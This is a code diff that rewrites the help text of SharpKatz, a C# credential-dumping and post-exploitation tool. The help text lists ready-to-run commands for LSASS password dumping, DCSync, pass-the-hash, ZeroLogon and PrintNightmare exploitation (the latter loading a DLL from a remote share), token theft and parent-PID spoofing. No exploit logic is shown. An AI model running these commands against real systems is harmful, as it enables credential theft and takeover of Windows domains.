@@ -176,62 +176,67 @@ namespace SharpKatz
                 Console.WriteLine(e.Message);
             }
 
-            if (showhelp)
+            if (string.IsNullOrEmpty(command))
             {
-                opts.WriteOptionDescriptions(Console.Out);
-                Console.WriteLine();
-                Console.WriteLine("  Example: --Command logonpasswords");
-                Console.WriteLine("  Example: --Command ekeys");
-                Console.WriteLine("  Example: --Command msv");
-                Console.WriteLine("  Example: --Command kerberos");
-                Console.WriteLine("  Example: --Command tspkg");
-                Console.WriteLine("  Example: --Command credman");
-                Console.WriteLine("  Example: --Command wdigest");
-                Console.WriteLine("  Example: --Command dcsync --User user --Domain userdomain --DomainController dc");
-                Console.WriteLine("  Example: --Command dcsync --Guid guid --Domain userdomain --DomainController dc");
-                Console.WriteLine("  Example: --Command dcsync --Domain userdomain --DomainController dc");
-                Console.WriteLine("  Example: --Command pth --User username --Domain userdomain --NtlmHash ntlmhash");
-                Console.WriteLine("  Example: --Command pth --User username --Domain userdomain --Rc4 rc4key");
-                Console.WriteLine("  Example: --Command pth --Luid luid --NtlmHash ntlmhash");
-                Console.WriteLine("  Example: --Command pth --User username --Domain userdomain --NtlmHash ntlmhash --aes128 aes256");
-                Console.WriteLine("  Example: --Command zerologon --Mode check --Target dc.domain.local --MachineAccount DC$");
-                Console.WriteLine("  Example: --Command zerologon --Mode exploit --Target dc.domain.local --MachineAccount DC$");
-                Console.WriteLine("  Example: --Command zerologon --Mode auto --Target dc.domain.local --MachineAccount DC$ --Domain domain.local --User krbtgt --DomainController dc.domain.local");
-                Console.WriteLine("  Example: --Command printnightmare --Target dc --Library \\\\host\\share\\lib.dll");
-                Console.WriteLine("  Example: --Command printnightmare --Target dc --Library \\\\host\\share\\lib.dll --AuthUser user --AuthPassword password --AuthDomain dom");
-                Console.WriteLine("  Example: --Command hivenightmare");
-                Console.WriteLine("  Example: --Command dumpsam --System <system_path> --Sam <sam_path>");
-                Console.WriteLine("  Example: --Command lsasecrets --System <system_path> --Security <security_path>");
-                Console.WriteLine("  Example: --Command lsacache --System <system_path> --Security <security_path>");
-                Console.WriteLine("  Example: --Command certexport");
-                Console.WriteLine("  Example: --Command certexport --CertExport true --CertDir C:\\certs");
-                Console.WriteLine("  Example: --Command listshadows");
-                Console.WriteLine("  Example: --Command token --Mode list");
-                Console.WriteLine("  Example: --Command token --Mode steal --Pid 1234");
-                Console.WriteLine("  Example: --Command token --Mode make --User admin --Domain CORP --Password pass123");
-                Console.WriteLine("  Example: --Command token --Mode elevate");
-                Console.WriteLine("  Example: --Command token --Mode revert");
-                Console.WriteLine("  Example: --Command vault");
-                Console.WriteLine("  Example: --Command spawn --Binary C:\\Windows\\System32\\cmd.exe");
-                Console.WriteLine("  Example: --Command spawn --Binary cmd.exe --ParentPid 1234");
-                Console.WriteLine("  Example: --Command spawn --Binary cmd.exe --ParentName svchost");
-                Console.WriteLine();
-                Console.WriteLine("  DPAPI:");
-                Console.WriteLine("  Example: --Command dpapimasterkey --MasterkeyFile <path> --Sid <user SID> --Password <password>");
-                Console.WriteLine("  Example: --Command dpapimasterkey --MasterkeyFile <path> --Sid <user SID> --Hash <SHA1 hash>");
-                Console.WriteLine("  Example: --Command dpapimasterkey --MasterkeyFile <path> --PvkFile <domain backup key .pvk>");
-                Console.WriteLine("  Example: --Command dpapimasterkey --MasterkeyFile <path> --BackupKey <hex backup key>");
-                Console.WriteLine("  Example: --Command dpapiblob --BlobFile <path> --Masterkey <hex key>");
-                Console.WriteLine("  Example: --Command dpapiblob --BlobFile <path> --MkGuid <GUID> --Masterkey <hex key>");
-                Console.WriteLine("  Example: --Command dpapiblob --BlobFile <path> --MkFile <guid:hex file>");
-                Console.WriteLine("  Example: --Command backupkeys --DC dc.domain.local");
-                Console.WriteLine("  Example: --Command backupkeys --DC dc.domain.local --OutputDir C:\\keys");
-                Console.WriteLine("  Example: --Command sekurlsadpapi");
-                return;
+                showhelp = true;
             }
 
-            if (string.IsNullOrEmpty(command))
-                command = "logonpasswords";
+            if (showhelp)
+            {
+                Console.WriteLine();
+                Console.WriteLine("  Usage: SharpKatz.exe --Command <command> [options]");
+                Console.WriteLine();
+                Console.WriteLine("  Available commands:");
+                Console.WriteLine();
+                Console.WriteLine("  sekurlsa:");
+                Console.WriteLine("    logonpasswords       Dump credentials from all providers");
+                Console.WriteLine("    msv                  MSV provider credentials");
+                Console.WriteLine("    kerberos             Kerberos provider credentials");
+                Console.WriteLine("    tspkg                TsPkg provider credentials");
+                Console.WriteLine("    credman              Credential Manager credentials");
+                Console.WriteLine("    wdigest              WDigest provider credentials");
+                Console.WriteLine("    ekeys                Kerberos encryption keys");
+                Console.WriteLine("    sekurlsadpapi        Cached DPAPI masterkeys from LSASS");
+                Console.WriteLine();
+                Console.WriteLine("  lsadump:");
+                Console.WriteLine("    dcsync               DCSync — dump AD credentials via DRS");
+                Console.WriteLine("    dumpsam              Dump SAM database from registry hives");
+                Console.WriteLine("    lsasecrets           Dump LSA secrets from SECURITY hive");
+                Console.WriteLine("    lsacache             Dump cached domain logons (DCC2)");
+                Console.WriteLine("    backupkeys           Extract DPAPI domain backup keys from DC");
+                Console.WriteLine();
+                Console.WriteLine("  dpapi:");
+                Console.WriteLine("    dpapimasterkey       Decrypt DPAPI masterkey file");
+                Console.WriteLine("    dpapiblob            Decrypt DPAPI-protected blob");
+                Console.WriteLine();
+                Console.WriteLine("  crypto:");
+                Console.WriteLine("    certexport           Export certificates from local store");
+                Console.WriteLine();
+                Console.WriteLine("  exploit:");
+                Console.WriteLine("    zerologon            CVE-2020-1472 Netlogon");
+                Console.WriteLine("    printnightmare       CVE-2021-1675 PrintSpooler RCE");
+                Console.WriteLine("    hivenightmare        CVE-2021-36934 SAM hive read");
+                Console.WriteLine();
+                Console.WriteLine("  misc:");
+                Console.WriteLine("    pth                  Pass-the-Hash");
+                Console.WriteLine("    token                Token manipulation");
+                Console.WriteLine("    vault                Windows Vault credentials");
+                Console.WriteLine("    spawn                Spawn process with PPID spoofing");
+                Console.WriteLine("    listshadows          Enumerate shadow copies");
+                Console.WriteLine();
+                Console.WriteLine("  Examples:");
+                Console.WriteLine("    SharpKatz.exe --Command logonpasswords");
+                Console.WriteLine("    SharpKatz.exe --Command dcsync --User admin --Domain corp.local --DomainController dc01");
+                Console.WriteLine("    SharpKatz.exe --Command pth --User admin --Domain corp --NtlmHash <hash>");
+                Console.WriteLine("    SharpKatz.exe --Command dumpsam --System <system_path> --Sam <sam_path>");
+                Console.WriteLine("    SharpKatz.exe --Command dpapimasterkey --MasterkeyFile <path> --Sid <SID> --Password <pass>");
+                Console.WriteLine("    SharpKatz.exe --Command token --Mode list");
+                Console.WriteLine("    SharpKatz.exe --Command spawn --Binary cmd.exe --ParentName svchost");
+                Console.WriteLine();
+                Console.WriteLine("  Use --help for full parameter list");
+                Console.WriteLine();
+                return;
+            }
 
             if (!command.Equals("logonpasswords") && !command.Equals("msv") && !command.Equals("kerberos") && !command.Equals("credman") &&
                 !command.Equals("tspkg") && !command.Equals("wdigest") && !command.Equals("ekeys") && !command.Equals("dcsync") &&
